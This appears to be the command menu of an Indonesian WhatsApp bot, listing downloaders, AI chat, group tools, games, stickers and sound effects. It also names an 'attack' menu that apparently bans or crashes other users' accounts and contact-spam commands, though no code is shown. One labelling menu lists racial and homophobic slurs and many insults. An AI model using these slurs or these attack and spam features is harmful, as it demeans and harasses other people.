     ヤ ◦ ʟɪꜱᴛɢᴄ
     ヤ ◦ ᴄᴇᴋꜱɴ
     ヤ ◦ ʜᴅʀ
     ヤ ◦ ʟɪᴍɪᴛ
     ヤ ◦ ᴘᴇᴍʙᴀʏᴀʀᴀɴ
     ヤ ◦ ꜱᴇᴡᴀ
     ヤ ◦ ʀᴇɢɪꜱᴛᴇʀ
     ヤ ◦ ꜱᴄʀɪᴘᴛ
     ヤ ◦ ᴘɪɴ
     ヤ ◦ ᴅᴇʟ
     ヤ ◦ ɢᴄʙᴏᴛ
     ヤ ◦ ᴘʀᴏꜰɪʟᴇ
     ヤ ◦ ꜱᴛɪᴄᴋᴇʀ
     ヤ ◦ ᴄᴇᴋɢᴄ
     ヤ ◦ ɪᴅʙᴀʜᴀꜱᴀ
     ヤ ◦ ᴀꜰᴋ
     ヤ ◦ ʀᴇǫᴜᴇsᴛ
     ヤ ◦ ʀᴇᴘᴏʀᴛʙᴜɢ

┈─────────────────┈⫺
*メ A T T A C K M E N U メ*
┈─────────────────┈⫺
     ヤ ◦ ᴛᴇᴍᴘ-ʙᴀɴ
     ヤ ◦ ᴋʜᴀᴇʀᴜʟᴢx
     ヤ ◦ ɢᴏʏᴀɴɢ
     ヤ ◦ ᴍɪx
┈─────────────────┈⫺
*メ D O W N L O A D M E N U メ*
┈─────────────────┈⫺
     ヤ ◦ ᴘʟᴀʏ
     ヤ ◦ ʏᴛᴍᴘ4
     ヤ ◦ ʏᴛᴍᴘ3
     ヤ ◦ ɪɴꜱᴛᴀɢʀᴀᴍ
     ヤ ◦ ᴛɪᴋᴛᴏᴋ
     ヤ ◦ ᴛɪᴋᴛᴏᴋ2
     ヤ ◦ ᴛɪᴋᴛᴏᴋsʟɪᴅᴇ
     ヤ ◦ ᴛɪᴋᴛᴏᴋsʟɪᴅᴇ2
     ヤ ◦ ꜱᴘᴏᴛɪꜰʏ
     ヤ ◦ ᴛɪᴋᴛᴏᴋᴀᴜᴅɪᴏ
     ヤ ◦ ᴍᴇᴅɪᴀꜰɪʀᴇ
     ヤ ◦ ʏᴛs
     ヤ ◦ ᴛᴛsᴇᴀʀᴄʜ
     ヤ ◦ ɢᴏᴏɢʟᴇ
     ヤ ◦ ᴛᴡɪᴛᴛᴇʀ
     ヤ ◦ ɢᴅʀɪᴠᴇ
     ヤ ◦ ɢɪᴛᴄʟᴏɴᴇ
     ヤ ◦ ᴘɪɴ
     ヤ ◦ ᴄᴀᴘᴄᴜᴛ
     ヤ ◦ ᴠɪᴅᴇʏ
     ヤ ◦ ᴅᴏᴡɴʟᴏᴀᴅ

┈─────────────────┈⫺
*メ A I M E N U*
┈─────────────────┈⫺
     ヤ ◦ ᴀɪ
     ヤ ◦ ᴏᴘᴇɴᴀɪ
     ヤ ◦ ꜱɪᴍɪ
     ヤ ◦ ꜱɪᴍɪꜱɪᴍɪ
     ヤ ◦ ᴛᴏᴢᴏᴍʙɪᴇ
     ヤ ◦ ᴀᴍʙᴀᴛᴜᴋᴀᴍ
     ヤ ◦ ꜰɪɴꜱɪɪ
     ヤ ◦ ʙᴇʟʟᴀ
     ヤ ◦ ʀᴇᴍɪɴɪ
     ヤ ◦ ʜᴅ2

┈─────────────────┈⫺
*メ C O N V E R T M E N U メ*
┈─────────────────┈⫺
     ヤ ◦ ᴛᴏᴜʀʟ
     ヤ ◦ ꜱᴛɪᴄᴋᴇʀ
     ヤ ◦ ꜱᴍᴇᴍᴇ
     ヤ ◦ ʜᴅʀ
     ヤ ◦ ɢᴇᴛᴘɪᴄ
     ヤ ◦ ɢᴇᴛɴᴀᴍᴇ
     ヤ ◦ ǫᴄ
     ヤ ◦ ǫᴄ2
     ヤ ◦ ᴛᴏᴀᴜᴅɪᴏ
     ヤ ◦ ᴏʙꜰᴜꜱ
     ヤ ◦ ꜱꜱᴡᴇʙ
     ヤ ◦ ᴛᴏɪᴍɢ
     ヤ ◦ ᴛᴏᴢᴏᴍʙɪᴇ
     ヤ ◦ ʀᴇᴍᴏᴠᴇʙɢ
     ヤ ◦ ǫᴄɪᴍᴀɢᴇ

┈─────────────────┈⫺
*メ G R O U P M E N U メ*
┈─────────────────┈⫺
     ヤ ◦ ᴛᴀɢᴀʟʟ
     ヤ ◦ ʜɪᴅᴇᴛᴀɢ
     ヤ ◦ ᴅᴇᴍᴏᴛᴇ
     ヤ ◦ ᴘʀᴏᴍᴏᴛᴇ
     ヤ ◦ ᴀᴅᴅ
     ヤ ◦ ᴋɪᴄᴋ
     ヤ ◦ ɪɴᴠɪᴛᴇ
     ヤ ◦ ꜱᴇɴᴅʟɪɴᴋɢᴄ
     ヤ ◦ ʀᴇꜱᴇᴛʟɪɴᴋɢᴄ
     ヤ ◦ ʟɪɴᴋɢʀᴏᴜᴘ
     ヤ ◦ ᴛᴏᴛᴀɢ
     ヤ ◦ ᴀɴᴛɪʟɪɴᴋ
     ヤ ◦ ᴀɴᴛɪʙᴏᴛ
     ヤ ◦ ꜱᴇᴛᴘᴘɢʀᴏᴜᴘ
     ヤ ◦ ᴅᴇʟ
     ヤ ◦ ꜱᴇᴛɴᴀᴍᴇɢᴄ
     ヤ ◦ ᴅᴇʟᴘᴘɢᴄ
     ヤ ◦ ᴏᴘᴇɴᴛɪᴍᴇ
     ヤ ◦ ᴄʟᴏꜱᴇᴛɪᴍᴇ
     ヤ ◦ ᴡᴇʟᴄᴏᴍᴇ
     ヤ ◦ ᴄᴇᴋᴍᴇᴍ
     ヤ ◦ ᴛɪᴍᴇʀɢᴄ
     ヤ ◦ ᴄᴇᴋsɪᴅᴇʀ
     ヤ ◦ ᴛᴀɢᴀᴅᴍɪɴ
     ヤ ◦ ᴡᴀʀɴ @tag
     ヤ ◦ ᴅᴇʟᴡᴀʀɴ @tag
     ヤ ◦ ʟɪsᴛᴡᴀʀɴ
     ヤ ◦ ᴠɪᴇᴡᴏɴᴄᴇ ᴏɴ/ᴏғ

┈─────────────────┈⫺
*メ P U S H M E N U メ*
┈─────────────────┈⫺
     ヤ ◦ ᴘᴜꜱʜᴀᴋᴏɴᴛᴀᴋ2
     ヤ ◦ ᴘᴜꜱʜᴋᴏɴᴛᴀᴋ
     ヤ ◦ ᴄᴇᴋɪᴅɢᴄ
     ヤ ◦ ɢᴇᴛɪᴅɢᴄ

┈─────────────────┈⫺
*メ A N O N Y M O U S MENU メ*
┈─────────────────┈⫺
     ヤ ◦ ᴍᴇɴғᴇs
     ヤ ◦ ʙᴀʟᴀsᴍᴇɴғᴇs
     ヤ ◦ lanjut (ᴄᴏᴍɪɴɢ sᴏᴏɴ) 
     ヤ ◦ sᴛᴀʀᴛ (ᴄᴏᴍɪɴɢ sᴏᴏɴ) 
     ヤ ◦ sᴇɴᴅᴘʀᴏғɪʟᴇ (ᴄᴏᴍɪɴɢ sᴏᴏɴ) 
     ヤ ◦ ᴀɴᴏɴʏᴍᴏᴜsᴄʜᴀᴛ (ᴄᴏᴍɪɴɢ sᴏᴏɴ)
     ヤ ◦ ɴᴜʟɪsᴋᴀɴᴀɴ
     ヤ ◦ ɴᴜʟɪsᴋɪʀɪ
     ヤ ◦ ғᴏʟɪᴏᴋɪʀɪ
     ヤ ◦ ғᴏʟɪᴏᴋᴀɴᴀɴ
     
┈─────────────────┈⫺
*メ P R I M B O N M E N U メ*
┈─────────────────┈⫺
     ヤ ◦ ᴀʀᴛɪɴᴀᴍᴀ 
     ヤ ◦ ᴀʀᴛɪᴍɪᴍᴘɪ 
     ヤ ◦ ᴋᴇᴄᴏᴄᴏᴋᴀɴᴘᴀꜱᴀɴɢᴀɴ 
     ヤ ◦ ᴋᴇᴄᴏᴄᴏᴋᴀɴɴᴀᴍᴀ 
     ヤ ◦ ᴊᴀᴅɪᴀɴᴘᴇʀɴɪᴋᴀʜᴀɴ 
     ヤ ◦ ʀᴇᴊᴇᴋɪ 
     ヤ ◦ ꜱɪꜰᴀᴛᴜꜱᴀʜᴀ 
     ヤ ◦ ᴘᴇᴋᴇʀᴊᴀᴀɴ 
     ヤ ◦ ᴀʀᴛɪᴛᴀʀᴏᴛ 
     ヤ ◦ ᴘᴏᴛᴇɴꜱɪᴘᴇɴʏᴀᴋɪᴛ 
     ヤ ◦ ʀᴀᴍᴀʟᴀɴɴᴀꜱɪʙ 
     ヤ ◦ ʜᴀʀɪꜱᴀɴɢᴀʀ 
     ヤ ◦ ʜᴀʀɪʙᴀɪᴋ 
     ヤ ◦ ꜰᴇɴɢꜱʜᴜɪ 
     ヤ ◦ ɴᴀɢᴀʜᴀʀɪ
     ヤ ◦ ʜᴀʀɪɴᴀᴀꜱ 
     ヤ ◦ ᴡᴇᴛᴏɴ 
     ヤ ◦ ᴘᴇʀᴜɴᴛᴜɴɢᴀɴ 
     ヤ ◦ ᴊᴏᴅᴏʜ
     ヤ ◦ ᴄᴀʀɪᴋᴀᴡᴀɴɢᴄ
     ヤ ◦ ᴀʀᴀʜʀᴇᴊᴇᴋɪ 
     ヤ ◦ ᴄᴇᴋᴍᴇᴍᴇᴋ
     ヤ ◦ ɴᴀᴍᴀɴɪɴᴊᴀ
     ヤ ◦ ᴄᴇᴋᴋʜᴏᴅᴀᴍ
     ヤ ◦ ꜱɪꜰᴀᴛ 
     ヤ ◦ ᴋᴇʙᴇʀᴜɴᴛᴜɴɢᴀɴ 
     ヤ ◦ ᴍᴇᴍᴀɴᴄɪɴɢ 
     ヤ ◦ ᴍᴀꜱᴀꜱᴜʙᴜʀ 
     ヤ ◦ ᴢᴏᴅɪᴀᴋ 
     ヤ ◦ ꜱʜɪᴏ 

┈─────────────────┈⫺
*メ A N I M E M E N U メ*
┈─────────────────┈⫺
     ヤ ◦ Kill
     ヤ ◦ Patt
     ヤ ◦ Lick
     ヤ ◦ Yeet
     ヤ ◦ Bonk
     ヤ ◦ Wink
     ヤ ◦ Ponk 
     ヤ ◦ Nom
     ヤ ◦ Slap
     ヤ ◦ Smile
     ヤ ◦ Wave
     ヤ ◦ Smug
     ヤ ◦ Dance
     ヤ ◦ Glomp
     ヤ ◦ Highfive
     ヤ ◦ Handhold
     ヤ ◦ akira
     ヤ ◦ akiyama
     ヤ ◦ ana
     ヤ ◦ asuna
     ヤ ◦ ayuzawa
     ヤ ◦ boruto
     ヤ ◦ chiho
     ヤ ◦ chitoge
     ヤ ◦ cosplaylo
     ヤ ◦ cosplaysagiri 
     ヤ ◦ deidara
     ヤ ◦ doraemon 
     ヤ ◦ elena
     ヤ ◦ emilia
     ヤ ◦ erza
     ヤ ◦ gremory
     ヤ ◦ hestia
     ヤ ◦ hinata
     ヤ ◦ husbu
     ヤ ◦ inori
     ヤ ◦ isuzu
     ヤ ◦ itachi
     ヤ ◦ itori
     ヤ ◦ kaga1
     ヤ ◦ kagura
     ヤ ◦ kakasih
     ヤ ◦ kaori
     ヤ ◦ keneki
     ヤ ◦ kotori
     ヤ ◦ kurumi
     ヤ ◦ lol
     ヤ ◦ madara 
     ヤ ◦ megumin
     ヤ ◦ mikey
     ヤ ◦ miku
     ヤ ◦ minato
     ヤ ◦ naruto
     ヤ ◦ neko
     ヤ ◦ neko2
     ヤ ◦ nekonime
     ヤ ◦ nezuko
     ヤ ◦ onepiece
     ヤ ◦ pokemon
     ヤ ◦ randomnime
     ヤ ◦ randomnime2
     ヤ ◦ rize 
     ヤ ◦ sagiri
     ヤ ◦ sakura
     ヤ ◦ sasuke
     ヤ ◦ shina
     ヤ ◦ shinka
     ヤ ◦ shinomiya
     ヤ ◦ shizuka
     ヤ ◦ shota
     ヤ ◦ tejina
     ヤ ◦ toukachan
     ヤ ◦ tsunade
     ヤ ◦ waifu
     ヤ ◦ animewall
     ヤ ◦ yotsuba
     ヤ ◦ yuki
     ヤ ◦ yulibocil
     ヤ ◦ yumeko
     ヤ ◦ 8ball
     ヤ ◦ tickle
     ヤ ◦ feed
     ヤ ◦ Waifu
     ヤ ◦ Neko
  
┈─────────────────┈⫺
*メ V O I C E M E N U メ*
┈─────────────────┈⫺
     ヤ ◦ bass
     ヤ ◦ blown
     ヤ ◦ deep
     ヤ ◦ earrape
     ヤ ◦ fast
     ヤ ◦ fat
     ヤ ◦ nightcore
     ヤ ◦ reverse 
     ヤ ◦ robot
     ヤ ◦ slow
     ヤ ◦ smooth
     ヤ ◦ squirrel

┈─────────────────┈⫺
*メ G A M E M E N U メ*
┈─────────────────┈⫺
     ヤ ◦ ᴛᴇʙᴀᴋʙᴏᴍ
     ヤ ◦ sᴜɪᴛ ᴘᴠᴘ
     ヤ ◦ ᴛᴇʙᴀᴋᴋᴀᴛᴀ
     ヤ ◦ ᴛᴇʙᴀᴋɢᴀᴍʙᴀʀ
     ヤ ◦ sᴜsᴜɴᴋᴀᴛᴀ
     ヤ ◦ ᴛɪᴄᴛᴀᴄᴛᴏᴇ
     ヤ ◦ ᴛᴇʙᴀᴋᴊᴋᴛ48
     ヤ ◦ ᴛᴇᴋᴀᴛᴇᴋɪ
     ヤ ◦ sɪᴀᴘᴀᴋᴀʜᴀᴋᴜ
     ヤ ◦ ᴛᴇʙᴀᴋʟɪʀɪᴋ
     ヤ ◦ ᴛᴇʙᴀᴋᴜᴍᴜʀ
     ヤ ◦ ʏᴇsɴᴏ
     ヤ ◦ ᴘᴇᴛᴀᴋʙᴏᴍ
     ヤ ◦ sᴜɪᴛʙᴏᴛ

┈─────────────────┈⫺
*メ R A N D O M T T M E N U メ*
┈─────────────────┈⫺
     ヤ ◦ ᴛɪᴋᴛᴏᴋɢɪʀʟ
     ヤ ◦ ᴛɪᴋᴛᴏᴋɴᴜᴋᴛʜʏ
     ヤ ◦ ᴛɪᴋᴛᴏᴋᴋᴀʏᴇꜱ
     ヤ ◦ ᴛɪᴋᴛᴏᴋᴘᴀɴʀɪᴋᴀ
     ヤ ◦ ᴛɪᴋᴛᴏᴋɴᴏᴛɴᴏᴛ
     ヤ ◦ ᴛɪᴋᴛᴏᴋɢʜᴇᴀ
     ヤ ◦ ᴛɪᴋᴛᴏᴋꜱᴀɴᴛᴜʏ
     ヤ ◦ ᴛɪᴋᴛᴏᴋʙᴏᴄɪʟ

┈─────────────────┈⫺
*メ S T I C K E R M E N U メ*
┈─────────────────┈⫺
     ヤ ◦ woof
     ヤ ◦ 8ball
     ヤ ◦ goose
     ヤ ◦ gecg
     ヤ ◦ feed
     ヤ ◦ avatar
     ヤ ◦ fox_gir
     ヤ ◦ lizard
     ヤ ◦ spank
     ヤ ◦ meow
     ヤ ◦ tickle
     
┈─────────────────┈⫺
*メ S E A R C H M E N U メ*
┈─────────────────┈⫺
     ヤ ◦ ɢᴏᴏɢʟᴇ
     ヤ ◦ ʟɪʀɪᴋ
     ヤ ◦ ᴛᴛꜱᴇᴀᴄʀʜ
     ヤ ◦ ʀᴇᴀᴅᴍᴏʀᴇ
     ヤ ◦ ᴀᴘᴋꜱᴇᴀʀᴄʜ
     ヤ ◦ ꜱᴛɪᴄᴋᴇʀꜱᴇᴀʀᴄʜ
     ヤ ◦ ᴊᴀʀᴀᴋ
     ヤ ◦ ssᴡᴇʙ
     ヤ ◦ ssᴡᴇʙᴅᴇsᴋᴛᴏᴘ
     ヤ ◦ ssᴡᴇʙᴛᴀʙʟᴇᴛ
     ヤ ◦ ssᴡᴇʙᴘʜᴏɴᴇ
     ヤ ◦ ꜱᴄ
     ヤ ◦ ᴏᴡɴᴇʀ
     ヤ ◦ ʀᴜʟᴇꜱ
     ヤ ◦ ᴀɪ
     ヤ ◦ ᴛɪᴋᴛᴏᴋsᴛᴀʟᴋ
     ヤ ◦ ɢᴀᴍᴇᴘᴏᴘ
     ヤ ◦ ᴋᴜʟɪɴᴇʀ
     ヤ ◦ ᴏᴛᴀᴋᴜᴅᴇsᴅᴇᴛᴀɪʟs
     ヤ ◦ ᴏᴛᴀᴋᴜᴅᴇssᴇᴀʀᴄʜ
     ヤ ◦ sɪᴀᴘᴀᴋᴀʜ
     ヤ ◦ ᴋᴄɪᴍɢ
     ヤ ◦ ᴍᴏᴅᴀᴘᴋ
     ヤ ◦ ǫᴜᴏᴛᴇs
     ヤ ◦ ɪsʟᴀᴍɴᴇᴡs
     ヤ ◦ quotesanime
     ヤ ◦ ǫᴜᴏᴛᴇsʙᴀᴄᴏᴛ
     ヤ ◦ ᴄᴜᴀᴄᴀ
     ヤ ◦ ғʟɪᴘᴛᴇxᴛ
     ヤ ◦ ʏᴛsᴇᴀʀᴄʜ
     ヤ ◦ ʏᴛs
     ヤ ◦ ʏᴛs2

┈─────────────────┈⫺
*メ I S L AM M E N U メ*
┈─────────────────┈⫺
     ヤ ◦ kisahnabi
     ヤ ◦ quotesislami
     ヤ ◦ niatsholat
     ヤ ◦ bacaansholat
     ヤ ◦ doaharian
     ヤ ◦ ayatkursi

┈─────────────────┈⫺
*メ A D D M E N U メ*
┈─────────────────┈⫺
     ヤ ◦ ꜱᴇᴛᴄᴍᴅ
     ヤ ◦ ᴅᴇʟᴄᴍᴅ
     ヤ ◦ ʟɪꜱᴛᴄᴍᴅ
     ヤ ◦ ᴀᴅᴅᴘᴅꜰ
     ヤ ◦ ᴅᴇʟᴘᴅꜰ
     ヤ ◦ ʟɪꜱᴛᴘᴅꜰ
     ヤ ◦ ʏᴏᴘᴅꜰ
     ヤ ◦ ꜱᴇɴᴅᴘᴅꜰ
     ヤ ◦ ᴀᴅᴅᴢɪᴘ
     ヤ ◦ ᴅᴇʟᴢɪᴘ
     ヤ ◦ ʟɪꜱᴛᴢɪᴘ
     ヤ ◦ ʏᴏᴢɪᴘ
     ヤ ◦ ꜱᴇɴᴅᴢɪᴘ
     ヤ ◦ ᴀᴅᴅᴀᴘᴋ
     ヤ ◦ ᴅᴇʟᴀᴘᴋ
     ヤ ◦ ʟɪꜱᴛᴀᴘᴋ
     ヤ ◦ ʏᴏᴀᴘᴋ
     ヤ ◦ ꜱᴇɴᴅᴀᴘᴋ
     ヤ ◦ ᴀᴅᴅᴠɴ
     ヤ ◦ ᴅᴇʟᴠɴ
     ヤ ◦ ʟɪꜱᴛᴠɴ
     ヤ ◦ ᴀᴅᴅᴍꜱɢ
     ヤ ◦ ꜱᴇɴᴅʟɪꜱᴛ
     ヤ ◦ ʟɪꜱᴛᴍꜱɢ
     ヤ ◦ ᴅᴇʟᴍꜱɢ
     ヤ ◦ ɢᴇᴛᴍꜱɢ

┈─────────────────┈⫺
*メ S I A P A K A H M E N U メ*
┈─────────────────┈⫺
     ヤ ◦ tolol
     ヤ ◦ gaguna
     ヤ ◦ jomok
     ヤ ◦ idiot
     ヤ ◦ gay
     ヤ ◦ lesbi
     ヤ ◦ anjink
     ヤ ◦ babi
     ヤ ◦ kucing
     ヤ ◦ beban
     ヤ ◦ bebankeluarga
     ヤ ◦ gadakeluarga
     ヤ ◦ miskin
     ヤ ◦ sampah
     ヤ ◦ wibu
     ヤ ◦ cantik
     ヤ ◦ ganteng
     ヤ ◦ tampan
     ヤ ◦ cute
     ヤ ◦ kind
     ヤ ◦ Islam
     ヤ ◦ kristen
     ヤ ◦ hindu
     ヤ ◦ katolik
     ヤ ◦ gandu
     ヤ ◦ madarchod
     ヤ ◦ kala
     ヤ ◦ gora
     ヤ ◦ chutiya
     ヤ ◦ nibba
     ヤ ◦ nibbi
     ヤ ◦ bhosdiwala
     ヤ ◦ chutmarika
     ヤ ◦ bokachoda
     ヤ ◦ suarerbaccha
     ヤ ◦ bolochoda
     ヤ ◦ muthal
     ヤ ◦ muthbaaz
     ヤ ◦ randibaaz
     ヤ ◦ topibaaz
     ヤ ◦ cunt
     ヤ ◦ nerd
     ヤ ◦ behenchod
     ヤ ◦ behnchoda
     ヤ ◦ bhosdika
     ヤ ◦ nerd
     ヤ ◦ mc
     ヤ ◦ bsdk
     ヤ ◦ bhosdk
     ヤ ◦ nigger
     ヤ ◦ loda
     ヤ ◦ laund
     ヤ ◦ nigga
     ヤ ◦ noobra
     ヤ ◦ tharki
     ヤ ◦ nibba
     ヤ ◦ nibbi
     ヤ ◦ mumu
     ヤ ◦ rascal
     ヤ ◦ scumbag
     ヤ ◦ nuts
     ヤ ◦ comrade
     ヤ ◦ fagot
     ヤ ◦ scoundrel
     ヤ ◦ ditch
     ヤ ◦ dope
     ヤ ◦ gucci
     ヤ ◦ lit
     ヤ ◦ dumbass
     ヤ ◦ sexy
     ヤ ◦ crackhead
     ヤ ◦ mf
     ヤ ◦ motherfucker
     ヤ ◦ dogla
     ヤ ◦ bewda
     ヤ ◦ boka
     ヤ ◦ khanki
     ヤ ◦ bal 
     ヤ ◦ sucker
     ヤ ◦ fuckboy
     ヤ ◦ playboy
     ヤ ◦ fuckgirl
     ヤ ◦ playgirl
     ヤ ◦ hot

┈─────────────────┈⫺
*メ R A N D O M F T M E N U メ*
┈─────────────────┈⫺
     ヤ ◦ aesthetic
     ヤ ◦ coffee
     ヤ ◦ wikimedia
     ヤ ◦ wallpaper
     ヤ ◦ art
     ヤ ◦ bts
     ヤ ◦ dogwoof
     ヤ ◦ catmeow
     ヤ ◦ lizardpic
     ヤ ◦ goosebird
     ヤ ◦ 8ballpool
     ヤ ◦ cosplay
     ヤ ◦ hacker
     ヤ ◦ cyber
     ヤ ◦ gamewallpaperm
     ヤ ◦ islamic
     ヤ ◦ jennie
     ヤ ◦ jiso
     ヤ ◦ satanic
     ヤ ◦ justina
     ヤ ◦ cartoon
     ヤ ◦ pentol
     ヤ ◦ cat
     ヤ ◦ kpop
     ヤ ◦ exo
     ヤ ◦ lisa
     ヤ ◦ space
     ヤ ◦ car
     ヤ ◦ technology
     ヤ ◦ bike
     ヤ ◦ shortquote
     ヤ ◦ antiwork
     ヤ ◦ hacking
     ヤ ◦ boneka
     ヤ ◦ rose
     ヤ ◦ ryujin
     ヤ ◦ ulzzangboy
     ヤ ◦ ulzzanggirl
     ヤ ◦ wall
     ヤ ◦ wallphone
     ヤ ◦ mountain
     ヤ ◦ goose
     ヤ ◦ profilepic
     ヤ ◦ couplepp
     ヤ ◦ programming
     ヤ ◦ pubg
     ヤ ◦ blackpink
     ヤ ◦ randomboy
     ヤ ◦ randomgirl
     ヤ ◦ hijab
     ヤ ◦ chinese
     ヤ ◦ indo
     ヤ ◦ japanese
     ヤ ◦ korean
     ヤ ◦ malay
     ヤ ◦ thai
     ヤ ◦ vietnamese
     ヤ ◦ suga
     ヤ ◦ wuyifan
     ヤ ◦ parkchanyeol
     ヤ ◦ ohsehun
     ヤ ◦ luhan
     ヤ ◦ kimtaehyung
     ヤ ◦ kimsoek
     ヤ ◦ kimnanjoon
     ヤ ◦ kimjunmyeon
     ヤ ◦ kimjong
     ヤ ◦ kimjondae
     ヤ ◦ jungkook
     ヤ ◦ jimin
     ヤ ◦ jhope
     ヤ ◦ huangzitao
     ヤ ◦ dohkyungsoo
     ヤ ◦ baekhyung

┈─────────────────┈⫺
*メ T E X T M A K E R M E N U メ*
┈─────────────────┈⫺
     ヤ ◦  blackpink
     ヤ ◦  rainbow2
     ヤ ◦  water_pipe
     ヤ ◦  halloween
     ヤ ◦  sketch
     ヤ ◦  sircuit
     ヤ ◦  discovery
     ヤ ◦  metallic2
     ヤ ◦  fiction
     ヤ ◦  demon
     ヤ ◦  transformer
     ヤ ◦  berry
     ヤ ◦  thunder
     ヤ ◦  magma
     ヤ ◦  3dstone
     ヤ ◦  neon
     ヤ ◦  glitch
     ヤ ◦  harry_potter
     ヤ ◦  embossed
     ヤ ◦  broken
     ヤ ◦  papercut
     ヤ ◦  gradient
     ヤ ◦  glossy
     ヤ ◦  watercolor
     ヤ ◦  multicolor
     ヤ ◦  neon_devil
     ヤ ◦  underwater
     ヤ ◦  bear
     ヤ ◦  wonderfulg
     ヤ ◦  christmas
     ヤ ◦  neon_light
     ヤ ◦  snow
     ヤ ◦  cloudsky
     ヤ ◦  luxury2
     ヤ ◦  gradient2
     ヤ ◦  summer
     ヤ ◦  writing
     ヤ ◦  engraved
     ヤ ◦  summery
     ヤ ◦  3dglue
     ヤ ◦  metaldark
     ヤ ◦  neonlight
     ヤ ◦  oscar
     ヤ ◦  minion
     ヤ ◦  holographic
     ヤ ◦  purple
     ヤ ◦  glossyb
     ヤ ◦  deluxe2
     ヤ ◦  glossyc
     ヤ ◦  fabric
     ヤ ◦  neonc
     ヤ ◦  newyear
     ヤ ◦  newyear2
     ヤ ◦  metals
     ヤ ◦  xmas
     ヤ ◦  blood
     ヤ ◦  darkg
     ヤ ◦  joker
     ヤ ◦  wicker
     ヤ ◦  natural
     ヤ ◦  firework
     ヤ ◦  skeleton
     ヤ ◦  balloon
     ヤ ◦  balloon2
     ヤ ◦  balloon3
     ヤ ◦  balloon4
     ヤ ◦  balloon5
     ヤ ◦  balloon6
     ヤ ◦  balloon7
     ヤ ◦  steel
     ヤ ◦  gloss
     ヤ ◦  denim
     ヤ ◦  decorate
     ヤ ◦  decorate2
     ヤ ◦  peridot
     ヤ ◦  rock
     ヤ ◦  glass
     ヤ ◦  glass2
     ヤ ◦  glass3
     ヤ ◦  glass4
     ヤ ◦  captain_as2
     ヤ ◦  robot
     ヤ ◦  equalizer
     ヤ ◦  toxic
     ヤ ◦  sparkling
     ヤ ◦  sparkling2
     ヤ ◦  sparkling3
     ヤ ◦  decorative
     ヤ ◦  chocolate
     ヤ ◦  strawberry
     ヤ ◦  koifish
     ヤ ◦  bread
     ヤ ◦  matrix
     ヤ ◦  blood2
     ヤ ◦  neonligth2
     ヤ ◦  thunder2
     ヤ ◦  3dbox
     ヤ ◦  neon2
     ヤ ◦  roadw
     ヤ ◦  bokeh
     ヤ ◦  gneon
     ヤ ◦  advanced
     ヤ ◦  dropwater
     ヤ ◦  wall
     ヤ ◦  chrismast
     ヤ ◦  honey
     ヤ ◦  drug
     ヤ ◦  marble
     ヤ ◦  marble2
     ヤ ◦  ice
     ヤ ◦  juice
     ヤ ◦  rusty
     ヤ ◦  abstra
     ヤ ◦  biscuit
     ヤ ◦  wood
     ヤ ◦  scifi
     ヤ ◦  metalr
     ヤ ◦  purpleg
     ヤ ◦  shiny
     ヤ ◦  jewelry
     ヤ ◦  jewelry2
     ヤ ◦  metalh
     ヤ ◦  golden
     ヤ ◦  glitter
     ヤ ◦  metale
     ヤ ◦  carbon
     ヤ ◦  candy
     ヤ ◦  metalb
     ヤ ◦  gemb
     ヤ ◦  3dchrome
     ヤ ◦  metalb2
     ヤ ◦  metalg

┈─────────────────┈⫺
*メ S O U N D M E N U*
┈─────────────────┈⫺
     ヤ ◦  sound1
     ヤ ◦  sound2
     ヤ ◦  sound3
     ヤ ◦  sound4
     ヤ ◦  sound5
     ヤ ◦  sound6
     ヤ ◦  sound7
     ヤ ◦  sound8
     ヤ ◦  sound9
     ヤ ◦  sound10
     ヤ ◦  sound11
     ヤ ◦  sound12
     ヤ ◦  sound13
     ヤ ◦  sound14
     ヤ ◦  sound15
     ヤ ◦  sound16
     ヤ ◦  sound17
     ヤ ◦  sound18
     ヤ ◦  sound18
     ヤ ◦  sound20
     ヤ ◦  sound21
     ヤ ◦  sound22
     ヤ ◦  sound23
     ヤ ◦  sound24
     ヤ ◦  sound25
     ヤ ◦  sound26
     ヤ ◦  sound27
     ヤ ◦  sound28
     ヤ ◦  sound29
     ヤ ◦  sound30
     ヤ ◦  sound31
     ヤ ◦  sound32
     ヤ ◦  sound33
     ヤ ◦  sound34
     ヤ ◦  sound35
     ヤ ◦  sound36
     ヤ ◦  sound37
     ヤ ◦  sound38
     ヤ ◦  sound39
     ヤ ◦  sound40
     ヤ ◦  sound41
     ヤ ◦  sound42
     ヤ ◦  sound43
     ヤ ◦  sound44
     ヤ ◦  sound45
     ヤ ◦  sound46
     ヤ ◦  sound47
     ヤ ◦  sound48
     ヤ ◦  sound49
     ヤ ◦  sound50
     ヤ ◦  sound51
     ヤ ◦  sound52
     ヤ ◦  sound53   
     ヤ ◦  sound54
     ヤ ◦  sound55
     ヤ ◦  sound56
     ヤ ◦  sound57
     ヤ ◦  sound58
     ヤ ◦  sound59
     ヤ ◦  sound60
     ヤ ◦  sound61
     ヤ ◦  sound62
     ヤ ◦  sound63
     ヤ ◦  sound64
     ヤ ◦  sound65
     ヤ ◦  sound66
     ヤ ◦  sound67
     ヤ ◦  sound68
     ヤ ◦  sound69
     ヤ ◦  sound70
     ヤ ◦  sound71
     ヤ ◦  sound72
     ヤ ◦  sound73
     ヤ ◦  sound74
     ヤ ◦  sound75
     ヤ ◦  sound76
     ヤ ◦  sound77
     ヤ ◦  sound78
     ヤ ◦  sound79
     ヤ ◦  sound80
     ヤ ◦  sound81
     ヤ ◦  sound82
     ヤ ◦  sound83
     ヤ ◦  sound84
     ヤ ◦  sound85
     ヤ ◦  sound86
     ヤ ◦  sound87
     ヤ ◦  sound88
     ヤ ◦  sound89
     ヤ ◦  sound90
     ヤ ◦  sound91
     ヤ ◦  sound92
     ヤ ◦  sound93
     ヤ ◦  sound94
     ヤ ◦  sound95
     ヤ ◦  sound96
     ヤ ◦  sound97
     ヤ ◦  sound98
     ヤ ◦  sound99
     ヤ ◦  sound100
     ヤ ◦  sound101
     ヤ ◦  sound102
     ヤ ◦  sound103
     ヤ ◦  sound104
     ヤ ◦  sound105
     ヤ ◦  sound106
     ヤ ◦  sound107
     ヤ ◦  sound108
     ヤ ◦  sound109
     ヤ ◦  sound110
     ヤ ◦  sound111
     ヤ ◦  sound112
     ヤ ◦  sound113
     ヤ ◦  sound114
     ヤ ◦  sound115
     ヤ ◦  sound116
     ヤ ◦  sound117
     ヤ ◦  sound118
     ヤ ◦  sound119
     ヤ ◦  sound120
     ヤ ◦  sound121
     ヤ ◦  sound122
     ヤ ◦  sound123
     ヤ ◦  sound124
     ヤ ◦  sound125
     ヤ ◦  sound126
     ヤ ◦  sound127
     ヤ ◦  sound128
     ヤ ◦  sound129
     ヤ ◦  sound130
     ヤ ◦  sound131
